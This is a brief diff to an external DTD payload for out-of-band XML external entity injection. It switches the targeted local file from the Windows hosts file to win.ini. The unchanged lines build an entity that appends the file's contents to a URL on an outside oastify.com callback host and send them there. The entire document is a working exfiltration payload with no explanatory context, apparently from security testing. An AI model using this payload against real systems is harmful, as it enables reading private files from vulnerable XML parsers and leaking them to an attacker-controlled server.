@@ -1,5 +1,6 @@
-<!ENTITY % file SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
+<!ENTITY % file SYSTEM "file:///C:/Windows/win.ini">
 <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://wiilqfet7l6n8q62a4v1upsbj2ptds1h.oastify.com/d=%file;'>">
 %eval;
 %exfil;
+
 
